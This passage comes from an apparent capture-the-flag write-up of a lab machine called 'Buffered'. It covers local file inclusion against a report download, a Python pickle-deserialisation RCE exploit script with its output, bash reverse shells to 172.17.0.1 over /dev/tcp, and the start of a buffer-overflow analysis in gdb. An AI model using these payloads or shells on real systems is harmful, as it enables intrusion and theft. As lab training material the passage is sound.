Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
c.ross@buffered_[REDACTED] (?)     
1g 0:00:00:24 DONE (2026-01-18 14:51) 0.04076g/s 55.76p/s 55.76c/s 55.76C/s c.ross@buffered_001333..c.ross@buffered_001368
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Okay so we got password of the user christine!

In particular can be used on the website that is on the port 5555

![Screenshot](/hard/Buffered/Images/image14.png)

We are in!

After a long time seeing the website and his multiple functions what it does I found something interesting on the **dashboard** page.

More in specific, the part of download report.

![Screenshot](/hard/Buffered/Images/image15.png)

We can download a txt file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ cat logins.txt 
[+] Successful login attempt by user: christine from IP: 127.0.0.1
[+] Successful login attempt by user: christine from IP: 127.0.0.1
[+] Successful login attempt by user: christine from IP: 127.0.0.1
```

We can see this, but what if we could intercept this request?

```r
------WebKitFormBoundaryctmv1DPLDTPUrsfB
Content-Disposition: form-data; name="report"

logins.txt <- /etc/passwd
------WebKitFormBoundaryctmv1DPLDTPUrsfB--
```

We can see this, what if we replace that txt into another file in the system?

for example **/etc/passwd**

And we can see this on the response:

```r
ETag: "1722655866.0-1031-393413677"
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
.........
```

We can see another files in the system!

This a LFI (Local File Inclusion), we could try to find if we can see potential files on the users of the system.

```r
------WebKitFormBoundaryTU62hpeAJCymU6sl
Content-Disposition: form-data; name="report"

/home/christine/.bashrc
------WebKitFormBoundaryTU62hpeAJCymU6sl--
```

In this case as the user christine.

```r
ETag: "1722357396.0-3771-1711540385"
Connection: close

# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
.........
```

We can see the files of the user **christine**, probably this website is being run by this user.

If we see what process are running in the machine we can see this:

```r
wilson@6f65e99ac74a:/tmp$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2808   196 ?        Ss   11:24   0:00 /bin/sh -c service mysql stop && rm -f /var/run/mysqld/mysqld.sock && rm -f /var/run/mysqld/mysqld.sock.lock && service mysql start && service nginx start &&  supervisord 
mysql         62  0.0  0.0   2808   200 ?        S    11:24   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        209  1.4  3.7 2442480 128252 ?      Sl   11:24   2:19 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=6f65e99ac74a.pid
root         350  0.0  0.0  11196   104 ?        Ss   11:24   0:00 nginx: master process /usr/sbin/nginx
www-data     351  0.0  0.0  11688  1988 ?        S    11:24   0:00 nginx: worker process
www-data     352  0.0  0.0  11688  2044 ?        S    11:24   0:00 nginx: worker process
www-data     353  0.0  0.0  11688  2032 ?        S    11:24   0:00 nginx: worker process
www-data     354  0.0  0.0  11688  2012 ?        S    11:24   0:00 nginx: worker process
root         355  0.0  0.1  34692  6636 ?        S    11:24   0:03 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
root         356  0.0  0.0   4820   180 ?        S    11:24   0:00 /bin/su - christine -c python /home/christine/.site/APP_3411/app.py
root         357  0.0  0.0   4820   184 ?        S    11:24   0:00 /bin/su - tyler -c /home/tyler/.dev/bufferbot
root         358  0.0  0.0   4820   184 ?        S    11:24   0:00 /bin/su - wilson -c dashboard
tyler        359  0.0  0.0   2828     8 ?        Ss   11:24   0:00 /home/tyler/.dev/bufferbot
wilson       360  0.0  0.6 470212 22444 ?        Ssl  11:24   0:05 /usr/bin/python3 /home/wilson/dashboard/app.py
christi+     361  0.0  0.8 469872 28032 ?        Ss   11:24   0:04 python /home/christine/.site/APP_3411/app.py
wilson       486  0.0  0.0   2808  1760 ?        S    11:41   0:00 /bin/sh -c /bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/1111 0>&1"
wilson       487  0.0  0.0   4760  3292 ?        S    11:41   0:00 /bin/bash -c /bin/bash -i >& /dev/tcp/172.17.0.1/1111 0>&1
wilson       488  0.0  0.1   5024  3856 ?        S    11:41   0:00 /bin/bash -i
wilson       491  0.0  0.2  15260  8648 ?        S    11:42   0:00 /usr/bin/python3 -c import pty; pty.spawn("/bin/bash")
wilson       492  0.0  0.1   5024  4112 pts/0    Ss   11:42   0:00 /bin/bash
wilson       522  0.0  0.2 1235600 7796 pts/0    Sl   12:51   0:00 ./chisel client 172.17.0.1:1234 R:5000:127.0.0.1:5000 R:5555:127.0.0.1:5555 R:9000:127.0.0.1:9000 R:33060:127.0.0.1:33060
wilson       598 16.6  0.1   8340  4272 pts/0    R+   14:09   0:00 ps aux
```

Could you see the interesting one?

And we found it that **christine** is running the following process:

```r
christi+     361  0.0  0.8 469872 28032 ?        Ss   11:24   0:04 python /home/christine/.site/APP_3411/app.py
```

We can see the app.py, let's try to see his content with this LFI.

```r
------WebKitFormBoundaryTU62hpeAJCymU6sl
Content-Disposition: form-data; name="report"

/home/christine/.site/APP_3411/app.py
------WebKitFormBoundaryTU62hpeAJCymU6sl--
```

And we can see this:

```python
ETag: "1722476856.0-8724-4163832994"
Connection: close

from flask import Flask, send_file, render_template, redirect, url_for, request, session, flash, jsonify, abort
from werkzeug.security import generate_password_hash  # Keep this for password hashing
from passlib.context import CryptContext  # Import CryptContext from passlib
import pickle
import mysql.connector
import base64
import logging
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key' 

pwd_context = CryptContext(schemes=["sha256_crypt"], deprecated="auto")

db_config = {
    'user': 'db_marketing_manager',
    'password': 'usyaw4Onn+',
    'host': 'localhost',
    'database': 'marketing_site',
    'use_pure': True,
    'auth_plugin': 'mysql_native_password',
    'ssl_disabled': True,
}

.........
```

We could see all the python script, even credentials of the database, it seems that is on the port 33060 that we discover before.

But it doesn't go in that way, in this script we can see that is being imported a very dangerous library, that is **pickle**.

With this library pickle is dangerous, and why?

Because it can lead to a RCE.

It's a bit way hard to explain, we need to talk about how python really works with serialised objects, a little bit of low level and all of that.

If you want to know more about all of this and why pickle is a bad idea to use, you can take a look [here](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

In resume when we **serialise** data with the format pickle, is working with bytes and when we **deserialise** is like recovering once again the info, but when pickle desarialise is executing byte by byte as soon when pickle does it.

Example:

```python
>>> import pickle
>>> pickle.dumps(["pwned", 1, 2, "yayy!!"])
b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.'
```

This is like format pickle.

To deserialise it we need to load that string of bytes, and we can see that the info is recovered.

```python
>>> pickle.loads(b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.')
['pwned', 1, 2, 'yayy!!']
```


We can recover the information, and you can see why this is vulnerable, we can make a payload that instead of doing all of this we can try to import the **os** library and execute arbitrary code.

Okay and where is vulnerable?

In this part of the script:

```python
@app.route('/submit_review', methods=['POST'])
def submit_review():
    product_name = request.form.get('product_name')
    review_text = request.form.get('review_text')
    rating = request.form.get('rating')
    mydata = request.form.get('mydata')
    if mydata:
        try:
            mydata_bytes = base64.b64decode(mydata)
            data = pickle.loads(mydata_bytes) # VULNERABLE
            print("Deserialized data:", data)
        except Exception as e:
            print("Deserialization error:", e)
    if save_review(product_name, review_text, rating):
        return jsonify({"status": "success", "message": "Review submitted!"}), 200
    else:
        return jsonify({"status": "error", "message": "Failed to submit review."}), 500
```

In this part when we submit a review of any product is making a POST to **/submit_review**

Is sharing normal content like **product_name, review_text,** etc.

But if we POST the content **mydata** the script is decoding the data in base64, and after doing that, it loads the data with pickle (RCE).

So im going to make a diagram with **excalidraw** to explain it better what does this vulnerable script:

![Screenshot](/hard/Buffered/Images/image16.png)

I hope you can understand it better, im going to make a exploit with python.

But before doing the exploit we need to see how is being send the data when we submit a review in the website.

![Screenshot](/hard/Buffered/Images/image17.png)

We can see that is being send into a WebkitFormBoundary data, this is important to know to send properly requests to the website.

```python
from pwn import *
from requests_toolbelt import MultipartEncoder
import pickle, signal, os, base64, string, random, requests

def stop(sig, frame):
    print()
    log.warn("QUITTING")
    sys.exit(0)

signal.signal(signal.SIGINT, stop)

def send(payload):
    target = "http://localhost:5555/submit_review"

    class RCE:
        def __reduce__(self):
            return (os.system, (payload,))

    format_pickle = pickle.dumps(RCE())
    converted = base64.b64encode(format_pickle)

    fields = {
        "product_name": "yes",
        "review_text": "tunometecabrasarambabiche",
        "rating": "0",
        "mydata": converted
    }

    bound = '----WebKitFormBoundary' + ''.join(random.sample(string.digits + string.ascii_letters, 16))

    final = MultipartEncoder(boundary=bound, fields=fields)

    heads = {
        "Content-Type": final.content_type,
        "Cookie": "session=[REDACTED]"
    }

    response = requests.post(url=target, headers=heads, data=final)

    log.info(f"Payload: {converted}")
    print(response.text)
    log.warn("PAYLOAD EXECUTED")

def start():
    while True:
        cmd = str(input("\n[*] CMD -> ")).strip()

        send(cmd)

if __name__ == "__main__":
    start()
```

Okay so let's see if the exploit works.

```r
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 pickle_rce.py 

[*] CMD -> touch /tmp/pwned
[*] Payload: b'gASVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu'
{"message":"Review submitted!","status":"success"}

[!] PAYLOAD EXECUTED
```

So I created a file **pwned** in **/tmp**.

```r
wilson@6f65e99ac74a:/tmp$ ls -l pwned 
-rw-rw-r-- 1 christine christine 0 Jan 18 15:18 pwned
```

We can see that the commands are being executed by **christine**!

Okay let's make a reverse shell then, and be in listen mode with **netcat** to receive the shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
```

Now let's execute the command to gain access as **christine**.

```r
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 pickle_rce.py 

[*] CMD -> bash -c 'bash -i >& /dev/tcp/172.17.0.1/2222 0>&1'
```

And we receive this.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 40914
bash: cannot set terminal process group (361): Inappropriate ioctl for device
bash: no job control in this shell
christine@6f65e99ac74a:~$ whoami
whoami
christine
```

So let's modify this shell as we did before, but in this case we can use script to spawn a bash.

---
# Lateral Movement Tyler

With this user as **christine** we are in a group:

```r
christine@6f65e99ac74a:~$ id
uid=1001(christine) gid=1001(christine) groups=1001(christine),1004(ftp)
```

We are inside of a group **ftp**, we could try to find possible files or directories with this group.

```r
christine@6f65e99ac74a:~$ find / -group ftp 2>/dev/null
/ftp
```

And we can see a directory, let's see what have in it.

```r
christine@6f65e99ac74a:~$ cd /ftp
christine@6f65e99ac74a:/ftp$ ls -la
total 24
drwxr-x--- 2 root ftp   4096 Jul 31  2024 .
drwxr-xr-x 1 root root  4096 Jan 18 11:24 ..
-rwxr-xr-x 1 root root 15448 Jul 31  2024 bufferbot
```

We can see this file **bufferbot**, and we can't execute it...

```r
christine@6f65e99ac74a:/ftp$ ./bufferbot 
bind: Address already in use
```

So let's transfer this executable once again with a python server and download it with wget

```r
christine@6f65e99ac74a:/ftp$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Okay let's download it then.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ wget http://172.17.0.2:100/bufferbot
--2026-01-18 16:46:48--  http://172.17.0.2:100/bufferbot
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15448 (15K) [application/octet-stream]
Saving to: ‘bufferbot’

bufferbot                                                   100%[==================================================>]  15.09K  --.-KB/s    in 0s      

2026-01-18 16:46:48 (318 MB/s) - ‘bufferbot’ saved [15448/15448]
```

Let's see a little bit of information of this binary with **file**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ file bufferbot 
bufferbot: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=05901d675607336b0810e7f6aa491fab899737c3, for GNU/Linux 3.2.0, not stripped
```

We can see that is a executable binary of 32 bits and not stripped this is great because we can see the name of the functions that is using this executable.

Okay let's execute it then:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ chmod +x bufferbot 
                                                                                
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./bufferbot 
bind: Address already in use
```

It seems that we have a port in use, because we are using chisel and is using a port, very probably the port 9000, so we could kill the process of chisel.

```r
wilson@6f65e99ac74a:/tmp$ ps u | grep chisel | grep -v grep | for i in $(awk '{print $2}'); do kill $i; done
```

With this command we kill the process of chisel without needing to search the PID of chisel.

Okay so let's execute once again the binary with our attack machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./bufferbot 
Server is listening on port 9000
```

We can see that is in listen mode in the port 9000, let's connect with netcat.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ nc 127.0.0.1 9000
⠀⣁⠒⣠⣌⢓⡙⣿⣿⡁⠨⢉⣐⠢⣸⣿⣿⣿⣿⣾⣿⣷⣾⣿⣯⣿⣿⣿⣿⣇⠂⣂⡋⠥⠊⣿⣿⢏⡞⣫⣄⠐⢀⡀
⣠⣶⣿⣿⣿⠌⠷⠹⣿⡿⡠⢘⣫⣾⣿⣿⣿⡿⢛⣫⣭⡶⠶⣭⣍⡛⢿⣿⣿⣿⣿⣝⡁⢄⢺⣿⠿⠼⠅⣿⣿⣿⣶⣦
⣿⣿⣿⣿⡿⡘⣱⣟⡂⠜⣴⣿⣿⣿⣿⡿⣩⣎⣿⣟⢪⢇⡰⣗⣿⣿⣇⣌⠻⣿⣿⣿⣿⣦⠳⢒⣿⣎⢃⢿⣿⣿⣿⣿
⣿⣿⣿⣿⠣⠰⣾⡶⠉⣼⣿⣿⣿⣿⢏⣾⡿⢿⣿⣮⢘⣆⠱⡂⣵⣿⣿⢿⣷⡙⣿⣿⣿⣿⣧⠫⢶⣷⠆⠜⣿⣿⢿⣿
⢿⣯⣪⣿⡄⢘⣽⣭⡆⣿⣿⣿⣿⡟⣼⣿⣷⢾⠳⠟⣹⢿⡶⣿⠻⠾⣻⣿⣿⣧⢹⣿⣿⣿⣿⢸⣭⣯⡇⢢⣿⣯⢪⣿
⢌⢿⣿⣿⣷⡈⢵⢿⣗⡸⣿⣿⣿⡇⠛⣿⡓⠁⢀⣀⡀⠈⠉⠀⣀⡀⠀⢩⡟⠋⢸⣿⣿⣿⢇⣺⡿⡮⢁⣾⣿⣿⣿⢏
⠹⣆⡛⢿⣿⣿⡄⢋⡏⠷⣈⠻⣿⣷⡀⣿⠇⠀⢾⣿⡿⠀⠀⢸⣿⡿⠀⢸⡀⠀⣼⣿⠟⣁⡺⢩⣝⢠⣾⣿⣿⠟⣁⢮
⣄⠈⠊⣢⡼⡶⣶⣿⣧⣦⡁⢋⠖⡭⢡⠄⠞⠄⣄⠈⠀⠀⠀⠀⠈⣀⡄⠢⠁⡌⢭⡲⡝⠊⣠⣮⣿⣶⡶⡲⣤⡛⠊⠂
⣭⡅⢺⣿⣇⣁⣼⣿⣶⣿⣷⡀⠘⠀⢥⣄⠀⠀⠋⠀⢿⠀⠀⢾⠀⠸⠁⠀⡀⣘⡁⠁⢀⣾⣿⣷⣿⣿⣌⣁⣿⣿⠃⣬
⢛⣡⣟⣿⣿⣏⣎⣿⡿⢿⣯⣷⢹⣆⠉⠻⣯⣖⣤⠄⣈⣀⣀⣀⠠⣤⣲⣼⠟⠁⢠⡟⡼⣭⣿⢿⣿⣯⣏⣿⣿⣟⣧⣙
⣿⣻⣿⣿⣻⣟⣷⣿⣿⣷⣶⢸⢸⣿⣿⣆⡄⡉⠛⠻⠿⠹⠏⠽⠛⠛⢉⢠⣰⣶⣿⣇⠇⢶⣾⣿⣿⣿⣿⣿⣻⣿⣿⣻
⢯⣽⣾⡟⣿⣿⣻⠱⣥⢸⠀⢀⣺⣿⢿⣷⣕⣹⣾⣧⣴⣶⣶⣦⣴⣷⣯⣨⢾⣿⣿⣿⡄⠈⠉⢮⡷⡋⣿⣿⣟⢿⣿⣭
⠧⡞⠩⠅⣚⣛⠃⢐⣒⠠⠂⣬⣿⡿⠾⢷⣿⣿⣿⣿⡿⣟⣛⢿⣿⣿⣿⣿⣿⠷⢿⣿⡶⠐⠨⢒⡒⠑⢛⣛⡓⠭⢑⢢
⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠸⣿⣯⢪⣿⡵⣽⣿⣿⣽⡜⣾⣷⢱⢫⣿⣿⡟⡟⣽⣝⡞⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤
⣩⣉⣓⠻⠿⡖⠠⠄⠀⠀⠴⣿⣏⢮⣉⡵⣻⣿⣿⣿⣾⣢⣴⣪⣿⣿⣿⣧⡣⣙⡡⣣⣿⣆⠀⠀⠀⠤⠐⣲⠿⢛⣊⣉
⣛⣛⠺⢿⣶⡤⣀⠀⠀⠀⠈⢿⠟⣿⣶⣯⢿⣟⡻⠿⠭⠭⠭⠭⠿⠟⣻⡿⢵⣷⣿⠻⢻⠃⠀⠀⠀⢀⡠⢴⣾⠿⢒⣛
⡕⡪⢝⢶⡬⡉⠀⠀⠀⠀⠀⢀⡙⠏⠓⠈⣁⣀⣤⣤⣤⣤⣤⣤⣤⣀⣀⣈⠉⠚⠩⢟⡁⠀⢀⠀⠀⠁⠀⡩⣴⢾⡫⣕
        [ B u f f e r b o t ]
hello?

Message received
```

And in the executable we can see this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./bufferbot 
Server is listening on port 9000
Buffer content: hello?
```

Okay let's try what if we send a lot of As?

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ nc 127.0.0.1 9000
⠀⣁⠒⣠⣌⢓⡙⣿⣿⡁⠨⢉⣐⠢⣸⣿⣿⣿⣿⣾⣿⣷⣾⣿⣯⣿⣿⣿⣿⣇⠂⣂⡋⠥⠊⣿⣿⢏⡞⣫⣄⠐⢀⡀
⣠⣶⣿⣿⣿⠌⠷⠹⣿⡿⡠⢘⣫⣾⣿⣿⣿⡿⢛⣫⣭⡶⠶⣭⣍⡛⢿⣿⣿⣿⣿⣝⡁⢄⢺⣿⠿⠼⠅⣿⣿⣿⣶⣦
⣿⣿⣿⣿⡿⡘⣱⣟⡂⠜⣴⣿⣿⣿⣿⡿⣩⣎⣿⣟⢪⢇⡰⣗⣿⣿⣇⣌⠻⣿⣿⣿⣿⣦⠳⢒⣿⣎⢃⢿⣿⣿⣿⣿
⣿⣿⣿⣿⠣⠰⣾⡶⠉⣼⣿⣿⣿⣿⢏⣾⡿⢿⣿⣮⢘⣆⠱⡂⣵⣿⣿⢿⣷⡙⣿⣿⣿⣿⣧⠫⢶⣷⠆⠜⣿⣿⢿⣿
⢿⣯⣪⣿⡄⢘⣽⣭⡆⣿⣿⣿⣿⡟⣼⣿⣷⢾⠳⠟⣹⢿⡶⣿⠻⠾⣻⣿⣿⣧⢹⣿⣿⣿⣿⢸⣭⣯⡇⢢⣿⣯⢪⣿
⢌⢿⣿⣿⣷⡈⢵⢿⣗⡸⣿⣿⣿⡇⠛⣿⡓⠁⢀⣀⡀⠈⠉⠀⣀⡀⠀⢩⡟⠋⢸⣿⣿⣿⢇⣺⡿⡮⢁⣾⣿⣿⣿⢏
⠹⣆⡛⢿⣿⣿⡄⢋⡏⠷⣈⠻⣿⣷⡀⣿⠇⠀⢾⣿⡿⠀⠀⢸⣿⡿⠀⢸⡀⠀⣼⣿⠟⣁⡺⢩⣝⢠⣾⣿⣿⠟⣁⢮
⣄⠈⠊⣢⡼⡶⣶⣿⣧⣦⡁⢋⠖⡭⢡⠄⠞⠄⣄⠈⠀⠀⠀⠀⠈⣀⡄⠢⠁⡌⢭⡲⡝⠊⣠⣮⣿⣶⡶⡲⣤⡛⠊⠂
⣭⡅⢺⣿⣇⣁⣼⣿⣶⣿⣷⡀⠘⠀⢥⣄⠀⠀⠋⠀⢿⠀⠀⢾⠀⠸⠁⠀⡀⣘⡁⠁⢀⣾⣿⣷⣿⣿⣌⣁⣿⣿⠃⣬
⢛⣡⣟⣿⣿⣏⣎⣿⡿⢿⣯⣷⢹⣆⠉⠻⣯⣖⣤⠄⣈⣀⣀⣀⠠⣤⣲⣼⠟⠁⢠⡟⡼⣭⣿⢿⣿⣯⣏⣿⣿⣟⣧⣙
⣿⣻⣿⣿⣻⣟⣷⣿⣿⣷⣶⢸⢸⣿⣿⣆⡄⡉⠛⠻⠿⠹⠏⠽⠛⠛⢉⢠⣰⣶⣿⣇⠇⢶⣾⣿⣿⣿⣿⣿⣻⣿⣿⣻
⢯⣽⣾⡟⣿⣿⣻⠱⣥⢸⠀⢀⣺⣿⢿⣷⣕⣹⣾⣧⣴⣶⣶⣦⣴⣷⣯⣨⢾⣿⣿⣿⡄⠈⠉⢮⡷⡋⣿⣿⣟⢿⣿⣭
⠧⡞⠩⠅⣚⣛⠃⢐⣒⠠⠂⣬⣿⡿⠾⢷⣿⣿⣿⣿⡿⣟⣛⢿⣿⣿⣿⣿⣿⠷⢿⣿⡶⠐⠨⢒⡒⠑⢛⣛⡓⠭⢑⢢
⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠸⣿⣯⢪⣿⡵⣽⣿⣿⣽⡜⣾⣷⢱⢫⣿⣿⡟⡟⣽⣝⡞⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤
⣩⣉⣓⠻⠿⡖⠠⠄⠀⠀⠴⣿⣏⢮⣉⡵⣻⣿⣿⣿⣾⣢⣴⣪⣿⣿⣿⣧⡣⣙⡡⣣⣿⣆⠀⠀⠀⠤⠐⣲⠿⢛⣊⣉
⣛⣛⠺⢿⣶⡤⣀⠀⠀⠀⠈⢿⠟⣿⣶⣯⢿⣟⡻⠿⠭⠭⠭⠭⠿⠟⣻⡿⢵⣷⣿⠻⢻⠃⠀⠀⠀⢀⡠⢴⣾⠿⢒⣛
⡕⡪⢝⢶⡬⡉⠀⠀⠀⠀⠀⢀⡙⠏⠓⠈⣁⣀⣤⣤⣤⣤⣤⣤⣤⣀⣀⣈⠉⠚⠩⢟⡁⠀⢀⠀⠀⠁⠀⡩⣴⢾⡫⣕
        [ B u f f e r b o t ]
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ......
```

We can see this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./bufferbot 
Server is listening on port 9000
Buffer content: hello?

Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAA ......
zsh: segmentation fault  ./bufferbot
```

A Buffer Overflow, let's run once again this binary with **GDB**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ gdb -q bufferbot 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from bufferbot...
(No debugging symbols found in bufferbot)
gef➤
```

im using **gef**, is like a plugin for **GDB**, you can install it [here](https://github.com/hugsy/gef)

Okay so let's see what protections have this binary with **checksec**.

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/buffered/files/bufferbot'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

We can see that this binary doesn't have protections, we can use **shellcodes** because NX (Not Executable) is disabled and we can gain access once again to the system probably to the user tyler, that is executing this binary.

So let's run it.

```r
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/buffered/files/bufferbot 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Server is listening on port 9000
```

Now let's connect once again and send a lot of As.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ nc 127.0.0.1 9000
⠀⣁⠒⣠⣌⢓⡙⣿⣿⡁⠨⢉⣐⠢⣸⣿⣿⣿⣿⣾⣿⣷⣾⣿⣯⣿⣿⣿⣿⣇⠂⣂⡋⠥⠊⣿⣿⢏⡞⣫⣄⠐⢀⡀
⣠⣶⣿⣿⣿⠌⠷⠹⣿⡿⡠⢘⣫⣾⣿⣿⣿⡿⢛⣫⣭⡶⠶⣭⣍⡛⢿⣿⣿⣿⣿⣝⡁⢄⢺⣿⠿⠼⠅⣿⣿⣿⣶⣦
⣿⣿⣿⣿⡿⡘⣱⣟⡂⠜⣴⣿⣿⣿⣿⡿⣩⣎⣿⣟⢪⢇⡰⣗⣿⣿⣇⣌⠻⣿⣿⣿⣿⣦⠳⢒⣿⣎⢃⢿⣿⣿⣿⣿
⣿⣿⣿⣿⠣⠰⣾⡶⠉⣼⣿⣿⣿⣿⢏⣾⡿⢿⣿⣮⢘⣆⠱⡂⣵⣿⣿⢿⣷⡙⣿⣿⣿⣿⣧⠫⢶⣷⠆⠜⣿⣿⢿⣿
⢿⣯⣪⣿⡄⢘⣽⣭⡆⣿⣿⣿⣿⡟⣼⣿⣷⢾⠳⠟⣹⢿⡶⣿⠻⠾⣻⣿⣿⣧⢹⣿⣿⣿⣿⢸⣭⣯⡇⢢⣿⣯⢪⣿
⢌⢿⣿⣿⣷⡈⢵⢿⣗⡸⣿⣿⣿⡇⠛⣿⡓⠁⢀⣀⡀⠈⠉⠀⣀⡀⠀⢩⡟⠋⢸⣿⣿⣿⢇⣺⡿⡮⢁⣾⣿⣿⣿⢏
⠹⣆⡛⢿⣿⣿⡄⢋⡏⠷⣈⠻⣿⣷⡀⣿⠇⠀⢾⣿⡿⠀⠀⢸⣿⡿⠀⢸⡀⠀⣼⣿⠟⣁⡺⢩⣝⢠⣾⣿⣿⠟⣁⢮
⣄⠈⠊⣢⡼⡶⣶⣿⣧⣦⡁⢋⠖⡭⢡⠄⠞⠄⣄⠈⠀⠀⠀⠀⠈⣀⡄⠢⠁⡌⢭⡲⡝⠊⣠⣮⣿⣶⡶⡲⣤⡛⠊⠂
⣭⡅⢺⣿⣇⣁⣼⣿⣶⣿⣷⡀⠘⠀⢥⣄⠀⠀⠋⠀⢿⠀⠀⢾⠀⠸⠁⠀⡀⣘⡁⠁⢀⣾⣿⣷⣿⣿⣌⣁⣿⣿⠃⣬
⢛⣡⣟⣿⣿⣏⣎⣿⡿⢿⣯⣷⢹⣆⠉⠻⣯⣖⣤⠄⣈⣀⣀⣀⠠⣤⣲⣼⠟⠁⢠⡟⡼⣭⣿⢿⣿⣯⣏⣿⣿⣟⣧⣙
⣿⣻⣿⣿⣻⣟⣷⣿⣿⣷⣶⢸⢸⣿⣿⣆⡄⡉⠛⠻⠿⠹⠏⠽⠛⠛⢉⢠⣰⣶⣿⣇⠇⢶⣾⣿⣿⣿⣿⣿⣻⣿⣿⣻
⢯⣽⣾⡟⣿⣿⣻⠱⣥⢸⠀⢀⣺⣿⢿⣷⣕⣹⣾⣧⣴⣶⣶⣦⣴⣷⣯⣨⢾⣿⣿⣿⡄⠈⠉⢮⡷⡋⣿⣿⣟⢿⣿⣭
⠧⡞⠩⠅⣚⣛⠃⢐⣒⠠⠂⣬⣿⡿⠾⢷⣿⣿⣿⣿⡿⣟⣛⢿⣿⣿⣿⣿⣿⠷⢿⣿⡶⠐⠨⢒⡒⠑⢛⣛⡓⠭⢑⢢
⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠸⣿⣯⢪⣿⡵⣽⣿⣿⣽⡜⣾⣷⢱⢫⣿⣿⡟⡟⣽⣝⡞⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤
⣩⣉⣓⠻⠿⡖⠠⠄⠀⠀⠴⣿⣏⢮⣉⡵⣻⣿⣿⣿⣾⣢⣴⣪⣿⣿⣿⣧⡣⣙⡡⣣⣿⣆⠀⠀⠀⠤⠐⣲⠿⢛⣊⣉
⣛⣛⠺⢿⣶⡤⣀⠀⠀⠀⠈⢿⠟⣿⣶⣯⢿⣟⡻⠿⠭⠭⠭⠭⠿⠟⣻⡿⢵⣷⣿⠻⢻⠃⠀⠀⠀⢀⡠⢴⣾⠿⢒⣛
⡕⡪⢝⢶⡬⡉⠀⠀⠀⠀⠀⢀⡙⠏⠓⠈⣁⣀⣤⣤⣤⣤⣤⣤⣤⣀⣀⣈⠉⠚⠩⢟⡁⠀⢀⠀⠀⠁⠀⡩⣴⢾⡫⣕
        [ B u f f e r b o t ]
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ......
```

And we can see this:

![Screenshot](/hard/Buffered/Images/image18.png)

We are overwriting another registers such as **EBP, EIP**...

In particular we have interest in the register **EIP** because if we can have control of this register we can lead the flow of the program.

To find the offset of this register we can create patterns, in gef we can do that.

```r
gef➤  pattern create 2048
[+] Generating a pattern of 2048 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaai.....                                           
[+] Saved as '$_gef0'
```

We copy all this payload to the clipboard an run once again run the program.

```r
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/buffered/files/bufferbot
[Thread debugging using libthread_db enabled]
